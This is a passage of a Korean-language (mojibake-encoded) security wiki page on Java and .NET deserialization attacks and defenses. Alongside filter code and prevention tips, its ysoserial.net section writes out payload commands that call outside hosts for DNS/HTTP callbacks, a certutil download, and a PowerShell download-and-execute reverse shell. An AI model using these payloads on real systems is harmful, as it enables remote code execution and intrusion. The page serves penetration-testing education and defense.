**`resolveClass()`** ë©”ì†Œë“œë¥¼ ì˜¤ë²„ë¼ì´ë“œí•˜ì—¬ í—ˆìš©ëœ í´ë˜ìŠ¤ë¡œì˜ ì—­ì§ë ¬í™”ë¥¼ ì œí•œí•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ëª…ì‹œì ìœ¼ë¡œ í—ˆìš©ëœ í´ë˜ìŠ¤ì¸ `Bicycle` í´ë˜ìŠ¤ë¡œì˜ ì—­ì§ë ¬í™”ë§Œ í—ˆìš©í•˜ëŠ” ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ ì–´ë–¤ í´ë˜ìŠ¤ì˜ ì—­ì§ë ¬í™”ë„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ë³´ì•ˆ í–¥ìƒì„ ìœ„í•œ Java ì—ì´ì „íŠ¸ ì‚¬ìš©**ì€ ì½”ë“œ ìˆ˜ì •ì´ ë¶ˆê°€ëŠ¥í•  ë•Œ ëŒ€ì•ˆì ì¸ í•´ê²°ì±…ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì£¼ë¡œ **í•´ë¡œìš´ í´ë˜ìŠ¤ë¥¼ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ë“±ë¡**í•˜ì—¬ JVM ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:
```
-javaagent:name-of-agent.jar
```
ë™ì ìœ¼ë¡œ ì§ë ¬í™”ë¥¼ ë³´í˜¸í•˜ëŠ” ë°©ë²•ì„ ì œê³µí•˜ì—¬ ì¦‰ì‹œ ì½”ë“œ ë³€ê²½ì´ ì–´ë ¤ìš´ í™˜ê²½ì— ì´ìƒì ì…ë‹ˆë‹¤.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)ì—ì„œ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”.

**ì§ë ¬í™” í•„í„° êµ¬í˜„**: Java 9ì—ì„œ **`ObjectInputFilter`** ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ì§ë ¬í™” í•„í„°ë¥¼ ë„ì…í•˜ì—¬ ì§ë ¬í™”ëœ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë˜ê¸° ì „ì— ì¶©ì¡±í•´ì•¼ í•˜ëŠ” ê¸°ì¤€ì„ ì§€ì •í•  ìˆ˜ ìˆëŠ” ê°•ë ¥í•œ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí–ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í•„í„°ëŠ” ì „ì—­ì ìœ¼ë¡œ ì ìš©í•˜ê±°ë‚˜ ìŠ¤íŠ¸ë¦¼ë³„ë¡œ ì ìš©í•˜ì—¬ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ì„¸ë°€í•˜ê²Œ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì§ë ¬í™” í•„í„°ë¥¼ í™œìš©í•˜ê¸° ìœ„í•´ ëª¨ë“  ì—­ì§ë ¬í™” ì‘ì—…ì— ì ìš©ë˜ëŠ” ì „ì—­ í•„í„°ë¥¼ ì„¤ì •í•˜ê±°ë‚˜ íŠ¹ì • ìŠ¤íŠ¸ë¦¼ì— ë™ì ìœ¼ë¡œ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**í–¥ìƒëœ ë³´ì•ˆì„ ìœ„í•œ ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í™œìš©**: **NotSoSerial**, **jdeserialize**, **Kryo**ì™€ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” Java ì—­ì§ë ¬í™”ë¥¼ ì œì–´í•˜ê³  ëª¨ë‹ˆí„°ë§í•˜ëŠ” ê³ ê¸‰ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í´ë˜ìŠ¤ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë˜ëŠ” ë¸”ë™ë¦¬ìŠ¤íŠ¸, ì—­ì§ë ¬í™” ì „ ì§ë ¬í™”ëœ ê°ì²´ ë¶„ì„, ì‚¬ìš©ì ì •ì˜ ì§ë ¬í™” ì „ëµ êµ¬í˜„ ë“± ì¶”ê°€ì ì¸ ë³´ì•ˆ ê³„ì¸µì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **NotSoSerial**ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œ ì‹¤í–‰ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ê°€ë¡œì±•ë‹ˆë‹¤.
* **jdeserialize**ì€ ì—­ì§ë ¬í™”í•˜ì§€ ì•Šê³  ì§ë ¬í™”ëœ Java ê°ì²´ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆì–´ ì ì¬ì ìœ¼ë¡œ ì•…ì˜ì ì¸ ì½˜í…ì¸ ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.
* **Kryo**ëŠ” ì†ë„ì™€ íš¨ìœ¨ì„±ì„ ê°•ì¡°í•˜ëŠ” ëŒ€ì²´ ì§ë ¬í™” í”„ë ˆì„ì›Œí¬ë¡œ, ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆëŠ” êµ¬ì„± ê°€ëŠ¥í•œ ì§ë ¬í™” ì „ëµì„ ì œê³µí•©ë‹ˆë‹¤.

### ì°¸ê³  ìë£Œ

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ì—­ì§ë ¬í™” ë° ysoserial í† í¬: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Gadgetinspectorì— ëŒ€í•œ í† í¬: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ë° ìŠ¬ë¼ì´ë“œ: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec ë…¼ë¬¸: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java ë° .Net JSON ì—­ì§ë ¬í™” **ë…¼ë¬¸:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** í† í¬: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ì—­ì§ë ¬í™” CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

**JNDI Injection**ì´ ë¬´ì—‡ì¸ì§€, **RMI, CORBA & LDAP**ë¥¼ í†µí•´ ì–´ë–»ê²Œ ë‚¨ìš©ë˜ë©° **log4shell**ì„ ì–´ë–»ê²Œ ì•…ìš©í•˜ëŠ”ì§€ (ì´ ì·¨ì•½ì ì˜ ì˜ˆì‹œ)ë¥¼ ë‹¤ìŒ í˜ì´ì§€ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) APIëŠ” ë‘ ê°œ ì´ìƒì˜ í´ë¼ì´ì–¸íŠ¸ ê°„ì— ë©”ì‹œì§€ë¥¼ ë³´ë‚´ê¸° ìœ„í•œ Java ë©”ì‹œì§€ ì§€í–¥ ë¯¸ë“¤ì›¨ì–´ APIì…ë‹ˆë‹¤. ì´ëŠ” ìƒì‚°ì-ì†Œë¹„ì ë¬¸ì œë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ êµ¬í˜„ì²´ì…ë‹ˆë‹¤. JMSëŠ” Java Platform, Enterprise Edition (Java EE)ì˜ ì¼ë¶€ì´ë©° Sun Microsystemsì—ì„œ ê°œë°œëœ ëª…ì„¸ì— ë”°ë¼ ê°œë°œë˜ì—ˆì§€ë§Œ í˜„ì¬ëŠ” Java Community Processì— ì˜í•´ ì´ëŒë¦¬ê³  ìˆìŠµë‹ˆë‹¤. Java EEë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ êµ¬ì„± ìš”ì†Œê°€ ë©”ì‹œì§€ë¥¼ ìƒì„±, ì „ì†¡, ìˆ˜ì‹  ë° ì½ì„ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë©”ì‹œì§• í‘œì¤€ì…ë‹ˆë‹¤. ë¶„ì‚° ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ë‹¤ë¥¸ êµ¬ì„± ìš”ì†Œ ê°„ í†µì‹ ì„ ëŠìŠ¨í•˜ê²Œ ê²°í•©ë˜ê³  ì‹ ë¢°ì„± ìˆê²Œ ë¹„ë™ê¸°ì ìœ¼ë¡œ ë§Œë“¤ì–´ì¤ë‹ˆë‹¤. (ì¶œì²˜: [ìœ„í‚¤í”¼ë””ì•„](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### ì œí’ˆ

ì´ ë¯¸ë“¤ì›¨ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ë³´ë‚´ëŠ” ì—¬ëŸ¬ ì œí’ˆì´ ìˆìŠµë‹ˆë‹¤:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### ì•…ìš©

ë”°ë¼ì„œ ê¸°ë³¸ì ìœ¼ë¡œ **ìœ„í—˜í•œ ë°©ì‹ìœ¼ë¡œ JMSë¥¼ ì‚¬ìš©í•˜ëŠ” ì„œë¹„ìŠ¤ë“¤ì´ ë§ì´ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ë¡œ ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ê¶Œí•œì´ ì¶©ë¶„í•˜ë‹¤ë©´ (ë³´í†µ ìœ íš¨í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤) **ì§ë ¬í™”ëœ ì•…ì˜ì  ê°ì²´ë¥¼ ì „ì†¡í•˜ì—¬ ì†Œë¹„ì/êµ¬ë…ìê°€ ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ì´ëŠ” ì´ ì•…ìš©ì—ì„œ ëª¨ë“  **ë©”ì‹œì§€ë¥¼ ì‚¬ìš©í•  í´ë¼ì´ì–¸íŠ¸ê°€ ê°ì—¼ë  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸**í•©ë‹ˆë‹¤.

ì„œë¹„ìŠ¤ê°€ ì·¨ì•½í•˜ë”ë¼ë„ (ì‚¬ìš©ì ì…ë ¥ì„ ì•ˆì „í•˜ê²Œ ì—­ì§ë ¬í™”í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì—) ì—¬ì „íˆ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì— ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

ë„êµ¬ [JMET](https://github.com/matthiaskaiser/jmet)ì€ **ì•Œë ¤ì§„ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ ì—¬ëŸ¬ ì•…ì˜ì  ê°ì²´ë¥¼ ë³´ë‚´ëŠ” ë°©ì‹ìœ¼ë¡œ ì´ ì„œë¹„ìŠ¤ì— ì—°ê²°í•˜ê³  ê³µê²©í•˜ëŠ” ë° ì‚¬ìš©**ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì•…ìš©ì€ ì„œë¹„ìŠ¤ê°€ ì—¬ì „íˆ ì·¨ì•½í•˜ê³  ì‚¬ìš©ëœ ê°€ì ¯ ì¤‘ í•˜ë‚˜ê°€ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì— ìˆì„ ê²½ìš°ì—ë§Œ ì‘ë™í•©ë‹ˆë‹¤.

### ì°¸ê³  ìë£Œ

* JMET í† í¬: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netì˜ ë§¥ë½ì—ì„œ, ì—­ì§ë ¬í™” ì•…ìš©ì€ Javaì—ì„œ ë°œê²¬ëœ ê²ƒê³¼ ìœ ì‚¬í•˜ê²Œ ì‘ë™í•˜ë©°, ê°€ì ¯ì´ ê°ì²´ì˜ ì—­ì§ë ¬í™” ì¤‘ì— íŠ¹ì • ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ ì•…ìš©ë©ë‹ˆë‹¤.
### ì§€ë¬¸

#### WhiteBox

ì†ŒìŠ¤ ì½”ë“œë¥¼ ê²€ì‚¬í•˜ì—¬ ë‹¤ìŒ ì‚¬í•­ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ì§‘ì¤‘í•´ì•¼ í•  ë¶€ë¶„ì€ ì‚¬ìš©ìê°€ ì œì–´í•˜ëŠ” ë³€ìˆ˜ì— ë”°ë¼ ìœ í˜•ì„ ê²°ì •í•  ìˆ˜ ìˆëŠ” ì§ë ¬í™” í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤.

#### BlackBox

ê²€ìƒ‰ ëŒ€ìƒì€ ì„œë²„ ì¸¡ì—ì„œ ì—­ì§ë ¬í™”ë  ìˆ˜ ìˆëŠ” Base64ë¡œ ì¸ì½”ë”©ëœ ë¬¸ìì—´ **AAEAAAD/////** ë˜ëŠ” ìœ ì‚¬í•œ íŒ¨í„´ì…ë‹ˆë‹¤. ì´ëŠ” `TypeObject` ë˜ëŠ” `$type`ì„ íŠ¹ì§•ìœ¼ë¡œ í•˜ëŠ” **JSON** ë˜ëŠ” **XML** êµ¬ì¡°ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ysoserial.net

ì´ ê²½ìš° [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì—­ì§ë ¬í™” exploitì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¹ƒ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ë‹¤ìš´ë¡œë“œí•œ í›„ Visual Studioì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë„êµ¬ë¥¼ ì»´íŒŒì¼**í•´ì•¼ í•©ë‹ˆë‹¤.

**ysoserial.net**ì˜ ì£¼ìš” ì˜µì…˜ì€ **`--gadget`**, **`--formatter`**, **`--output`**, **`--plugin`**ì…ë‹ˆë‹¤.

* **`--gadget`**ì€ ì•…ìš©í•  ê°€ì ¯ì„ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤ (ì—­ì§ë ¬í™” ì¤‘ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì•…ìš©ë  í´ë˜ìŠ¤/í•¨ìˆ˜ë¥¼ ì§€ì •).
* **`--formatter`**ëŠ” exploitì„ ì§ë ¬í™”í•˜ëŠ” ë°©ë²•ì„ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤ (í˜ì´ë¡œë“œë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë°±ì—”ë“œê°€ ì‚¬ìš©í•˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•˜ë©°, ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”í•´ì•¼ í•©ë‹ˆë‹¤).
* **`--output`**ì€ exploitì„ **raw** ë˜ëŠ” **base64**ë¡œ ì¸ì½”ë”©í• ì§€ë¥¼ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. _**ysoserial.net**ì€ í˜ì´ë¡œë“œë¥¼ **UTF-16LE**ë¡œ ì¸ì½”ë”©í•  ê²ƒì´ë¯€ë¡œ (Windowsì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì¸ì½”ë”©) ë¦¬ëˆ…ìŠ¤ ì½˜ì†”ì—ì„œ ì¸ì½”ë”©ë§Œ í•˜ë©´ **ì¸ì½”ë”© í˜¸í™˜ì„± ë¬¸ì œ**ê°€ ë°œìƒí•  ìˆ˜ ìˆì–´ì„œ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (HTB JSON ìƒìì—ì„œ í˜ì´ë¡œë“œëŠ” UTF-16LE ë° ASCIIì—ì„œ ëª¨ë‘ ì‘ë™í–ˆì§€ë§Œ í•­ìƒ ì‘ë™í•œë‹¤ëŠ” ì˜ë¯¸ëŠ” ì•„ë‹˜)._
* **`--plugin`** ysoserial.netì€ ViewStateì™€ ê°™ì€ **íŠ¹ì • í”„ë ˆì„ì›Œí¬ì— ëŒ€í•œ exploitì„ ë§Œë“¤ê¸° ìœ„í•œ í”ŒëŸ¬ê·¸ì¸**ì„ ì§€ì›í•©ë‹ˆë‹¤.

#### ì¶”ê°€ ysoserial.net ë§¤ê°œë³€ìˆ˜

* `--minify`ëŠ” **ë” ì‘ì€ í˜ì´ë¡œë“œ**ë¥¼ ì œê³µí•©ë‹ˆë‹¤ (ê°€ëŠ¥í•œ ê²½ìš°)
* `--raf -f Json.Net -c "anything"` ì´ê²ƒì€ ì œê³µëœ í¬ë§¤í„°(`Json.Net` ì´ ê²½ìš°)ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ê°€ì ¯ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* `--sf xml`ëŠ” **ê°€ì ¯ì„ ì§€ì •**í•  ìˆ˜ ìˆê³  ysoserial.netì€ "xml"ì„ í¬í•¨í•˜ëŠ” í¬ë§¤í„°ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤ (ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ìŒ).

**ysoserial ì˜ˆì œ**ë¥¼ ë§Œë“¤ì–´ë³´ì„¸ìš”:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**ì—ëŠ” ê° exploitì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë” ì˜ ì´í•´í•  ìˆ˜ ìˆë„ë¡ ë„ì™€ì£¼ëŠ” **ë§¤ìš° í¥ë¯¸ë¡œìš´ ë§¤ê°œë³€ìˆ˜**ì¸ `--test`ê°€ ìˆìŠµë‹ˆë‹¤. ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì§€ì •í•˜ë©´ **ysoserial.net**ì´ **ë¡œì»¬ì—ì„œ exploitì„ ì‹œë„**í•˜ì—¬ í˜ì´ë¡œë“œê°€ ì˜¬ë°”ë¥´ê²Œ ì‘ë™í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë§¤ê°œë³€ìˆ˜ëŠ” ìœ ìš©í•œë°, ì½”ë“œë¥¼ ê²€í† í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ ì²­í¬ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ ([ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ì—ì„œ).
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
ì´ëŠ” exploitì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì½”ë“œê°€ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ë¥¼ í˜¸ì¶œí•  ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**ì´ì „ ì½”ë“œëŠ” ìƒì„±ëœ ì•…ìš©ì— ì·¨ì•½**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ .Net ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ ì‚¬í•œ ê²ƒì„ ì°¾ìœ¼ë©´ í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì·¨ì•½í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ **`--test`** ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ **ysoserial.net**ì´ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì§ë ¬í™” ì•…ìš©ì— ì·¨ì•½í•œ **ì–´ë–¤ ì½”ë“œ ì²­í¬ì¸ì§€ ì´í•´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ViewState

[**.Netì˜ \_\_ViewState ë§¤ê°œë³€ìˆ˜ë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ POST**](exploiting-\_\_viewstate-parameter.md)ì„ ì‚´í´ë³´ê³  **ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•´ë³´ì„¸ìš”. í”¼í•´ì ë¨¸ì‹ ì—ì„œ ì‚¬ìš©ëœ **ë¹„ë°€ì„ ì´ë¯¸ ì•Œê³  ìˆë‹¤ë©´**, [**ì´ ê²Œì‹œë¬¼ì„ ì½ì–´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë³´ì„¸ìš”**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### ì˜ˆë°©

.Netì—ì„œ ì§ë ¬í™”ì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ì¤„ì´ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì„¸ìš”:

* **ë°ì´í„° ìŠ¤íŠ¸ë¦¼ì´ ê°ì²´ ìœ í˜•ì„ ì •ì˜í•˜ì§€ ëª»í•˜ë„ë¡**í•©ë‹ˆë‹¤. ê°€ëŠ¥í•œ ê²½ìš° `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **`JSON.Net`ì˜ ê²½ìš° `TypeNameHandling`ì„ `None`ìœ¼ë¡œ ì„¤ì •:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **`JavaScriptSerializer`ì™€ `JavaScriptTypeResolver`ë¥¼ í•¨ê»˜ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.**
* **ì§ë ¬í™”í•  ìˆ˜ ìˆëŠ” ìœ í˜•ì„ ì œí•œ**í•˜ì—¬ .Net ìœ í˜•ê³¼ ê´€ë ¨ëœ ì ì¬ì  ìœ„í—˜ì„ ì´í•´í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ `System.IO.FileInfo`ì™€ ê°™ì€ ìœ í˜•ì€ ì„œë²„ íŒŒì¼ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆì–´ ê±°ë¶€ ì„œë¹„ìŠ¤ ê³µê²©ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ìœ„í—˜í•œ ì†ì„±ì„ ê°€ì§„ ìœ í˜•ì— ì£¼ì˜**ë¥¼ ê¸°ìš¸ì…ë‹ˆë‹¤. `System.ComponentModel.DataAnnotations.ValidationException`ì˜ `Value` ì†ì„±ê³¼ ê°™ì´ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ì†ì„±ì´ ìˆëŠ” ê²½ìš°ì…ë‹ˆë‹¤.
